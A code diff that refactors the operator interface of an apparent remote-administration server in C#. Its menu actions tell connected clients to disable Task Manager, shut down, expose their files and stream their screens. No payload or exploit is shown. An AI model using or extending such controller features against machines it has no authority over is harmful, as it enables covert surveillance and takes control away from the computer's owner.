@@ -113,6 +113,12 @@ namespace Server
             }
         }
 
+        // Returns the first selected item, as there would be no point to open multiple toolstripmenus for each client.
+        private Client GetSelectedClient()
+        {
+            return SocketServer.GetClient(userView.SelectedItems[0].Index);
+        }
+
         private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             MessageboxCreator messageboxCreator = new MessageboxCreator(socketServer, userView.SelectedItems[0].Index);
@@ -121,23 +127,27 @@ namespace Server
 
         private void userMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
-            if (userView.SelectedItems.Count == 0) // No items selected, no need to open.
+            if (userView.SelectedItems.Count == 0 || GetSelectedClient() == null) // No items selected, no need to open.
             {
                 e.Cancel = true;
                 return;
             }
+
+            // Change the checkstate to match with the current status.
+            disableTaskmanagerToolStripMenuItem.Checked = GetSelectedClient().bTaskmgrDisabled;
         }
 
         private void disableTaskmanagerToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
         {
-            string messageBoxStr
+            string szTaskmgr
                 = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString();
-            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
+            SocketServer.Send(GetSelectedClient().socket, szTaskmgr);
+            SocketServer.Send(GetSelectedClient().socket, "<GET-TASKMGR-REG>");
         }
 
         private void shutdownClientToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>");
+            SocketServer.Send(GetSelectedClient().socket, "<SHUTDOWN-CLIENT>");
         }
 
         private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -148,13 +158,13 @@ namespace Server
 
         private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            UI.FileManager fileManager = new(userView.SelectedItems[0].Index);
+            UI.FileManager fileManager = new(GetSelectedClient());
             fileManager.ShowDialog();
         }
 
         private void viewScreenToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            UI.ScreenViewer screenViewer = new(userView.SelectedItems[0].Index);
+            UI.ScreenViewer screenViewer = new(GetSelectedClient());
             screenViewer.ShowDialog();
         }
     }
